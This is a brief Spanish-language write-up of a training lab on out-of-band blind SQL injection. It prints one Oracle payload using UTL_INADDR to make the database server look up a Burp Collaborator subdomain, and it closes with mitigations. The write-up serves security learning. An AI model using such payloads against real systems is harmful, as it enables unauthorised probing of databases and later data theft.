Lab 16

Blind SQL Injection with Out-of-Band Interaction

Información

Nivel: Practitioner

Tipo: Out-of-band SQL Injection

Objetivo

Provocar una interacción DNS desde el servidor de la base de datos hacia Burp Collaborator para confirmar la vulnerabilidad.

Procedimiento

Se generó un subdominio en Burp Collaborator.

Payload utilizado:

'||UTL_INADDR.get_host_address('subdominio.burpcollaborator.net')--

El servidor realizó una consulta DNS al dominio, confirmando la ejecución del payload.

Mitigación

  • Consultas parametrizadas.
  • Deshabilitar funciones externas innecesarias.
  • Monitoreo de tráfico DNS saliente.
